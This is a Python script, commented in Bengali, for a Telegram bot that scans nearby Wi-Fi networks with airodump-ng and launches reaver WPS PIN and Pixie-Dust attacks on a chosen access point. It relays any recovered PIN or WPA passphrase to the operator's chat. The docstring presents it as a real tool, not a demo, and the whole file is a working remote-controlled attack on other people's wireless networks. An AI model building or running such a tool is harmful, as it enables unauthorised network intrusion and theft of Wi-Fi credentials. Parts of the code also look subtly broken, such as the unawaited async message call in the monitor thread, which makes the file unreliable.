#!/usr/bin/env python3
"""
Telegram Bot for WPS Attack Control
ডেমো নয় – রিয়েল টুল চালানোর জন্য।
"""

import os
import subprocess
import re
import time
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ---------- কনফিগারেশন ----------
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"  # @BotFather থেকে নিন
ALLOWED_USERS = [123456789]           # আপনার টেলিগ্রাম ইউজার আইডি

# গ্লোবাল ভেরিয়েবল
attack_process = None
scan_output = ""
scanning = False

# ---------- হেল্পার ফাংশন ----------
def run_command(cmd, timeout=60):
    """শেল কমান্ড রান করে আউটপুট রিটার্ন করে"""
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate(timeout=timeout)
        return stdout + stderr
    except subprocess.TimeoutExpired:
        proc.kill()
        return "কমান্ড টাইমআউট।"
    except Exception as e:
        return str(e)

def get_interface():
    """মনিটর মোডে থাকা ইন্টারফেস খুঁজে (যেমন wlan0mon)"""
    output = run_command("sudo airmon-ng")
    lines = output.split("\n")
    for line in lines:
        if "mon" in line and "wlan" in line:
            parts = line.split()
            for p in parts:
                if "mon" in p:
                    return p
    return None

# ---------- বট কমান্ড ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("⛔ অনুমতি নেই।")
        return
    await update.message.reply_text(
        "👋 WPS অ্যাটাক বটে স্বাগতম!\n"
        "কমান্ড:\n"
        "/scan – নেটওয়ার্ক স্ক্যান করুন\n"
        "/attack <BSSID> – পিন অ্যাটাক শুরু\n"
        "/stop – অ্যাটাক বন্ধ করুন\n"
        "/status – অ্যাটাকের অবস্থা দেখুন\n"
        "/help – এই সাহায্য"
    )

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global scan_output, scanning
    if update.effective_user.id not in ALLOWED_USERS:
        return
    if scanning:
        await update.message.reply_text("⏳ ইতিমধ্যে স্ক্যান চলছে...")
        return

    scanning = True
    await update.message.reply_text("📡 স্ক্যান শুরু হচ্ছে (৩০ সেকেন্ড)...")

    # airodump-ng চালানো
    interface = get_interface()
    if not interface:
        await update.message.reply_text("❌ মনিটর মোডে কোনো ইন্টারফেস পাওয়া যায়নি।\n`sudo airmon-ng start wlan0` দিয়ে শুরু করুন।")
        scanning = False
        return

    cmd = f"sudo timeout 30 airodump-ng {interface} --output-format csv -w /tmp/scan"
    run_command(cmd, timeout=35)

    # CSV পার্স করে তালিকা তৈরি
    with open("/tmp/scan-01.csv", "r") as f:
        lines = f.readlines()

    networks = []
    for line in lines:
        if "BSSID" in line or "Station" in line or "Probe" in line or line.strip() == "":
            continue
        parts = line.split(",")
        if len(parts) >= 6:
            bssid = parts[0].strip()
            channel = parts[3].strip()
            essid = parts[13].strip() if len(parts) > 13 else ""
            if bssid and ":" in bssid:
                networks.append((bssid, channel, essid))

    scan_output = ""
    if not networks:
        scan_output = "কোনো নেটওয়ার্ক পাওয়া যায়নি।"
    else:
        scan_output = "📶 পাওয়া নেটওয়ার্ক:\n"
        for i, (bssid, ch, essid) in enumerate(networks[:20]):
            scan_output += f"{i+1}. {essid or '???'} | CH {ch} | {bssid}\n"

    # বোতাম তৈরি (প্রতিটি নেটওয়ার্কের জন্য)
    keyboard = []
    for i, (bssid, ch, essid) in enumerate(networks[:10]):
        label = f"{essid[:15] or '???'} ({bssid[-6:]})"
        callback_data = f"attack_{bssid}"
        keyboard.append([InlineKeyboardButton(label, callback_data=callback_data)])

    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
    await update.message.reply_text(scan_output, reply_markup=reply_markup)
    scanning = False

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    if update.effective_user.id not in ALLOWED_USERS:
        return
    if attack_process and attack_process.poll() is None:
        await update.message.reply_text("⏳ ইতিমধ্যে একটি অ্যাটাক চলছে। আগে /stop দিন।")
        return

    args = context.args
    if not args:
        await update.message.reply_text("❌ BSSID দিন। উদাহরণ: `/attack AA:BB:CC:DD:EE:FF`")
        return

    bssid = args[0].upper()
    if not re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid):
        await update.message.reply_text("❌ ভুল BSSID ফরম্যাট। সঠিক: AA:BB:CC:DD:EE:FF")
        return

    interface = get_interface()
    if not interface:
        await update.message.reply_text("❌ মনিটর ইন্টারফেস পাওয়া যায়নি।")
        return

    await update.message.reply_text(f"🔓 অ্যাটাক শুরু: {bssid}")

    # reaver বা bully চালানো (এখানে reaver ব্যবহার করছি)
    cmd = f"sudo reaver -i {interface} -b {bssid} -c 1 -vv -K 1 -N -d 2 -t 2 -r 3:2"
    attack_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    # অগ্রগতি দেখানোর জন্য একটি থ্রেড
    def monitor():
        while True:
            if attack_process.poll() is not None:
                break
            line = attack_process.stdout.readline()
            if line:
                if "WPS PIN" in line or "WPA PSK" in line or "PIN found" in line or "Failed" in line:
                    context.bot.send_message(chat_id=update.effective_chat.id, text=f"📝 {line.strip()}")
            time.sleep(0.5)
    threading.Thread(target=monitor, daemon=True).start()

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    if update.effective_user.id not in ALLOWED_USERS:
        return
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        await update.message.reply_text("⏹ অ্যাটাক বন্ধ করা হয়েছে।")
    else:
        await update.message.reply_text("কোনো অ্যাটাক চলছে না।")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_process
    if update.effective_user.id not in ALLOWED_USERS:
        return
    if attack_process and attack_process.poll() is None:
        await update.message.reply_text("🔄 অ্যাটাক চলমান...")
    else:
        await update.message.reply_text("⏸ কোনো অ্যাটাক চলছে না।")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("attack_"):
        bssid = query.data.split("_")[1]
        # attack কমান্ড কল করুন
        context.args = [bssid]
        await attack(update, context)

# ---------- মেইন ফাংশন ----------
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("scan", scan))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CallbackQueryHandler(button_callback))

    print("🤖 বট চালু হয়েছে।")
    application.run_polling()

if __name__ == "__main__":
    main()
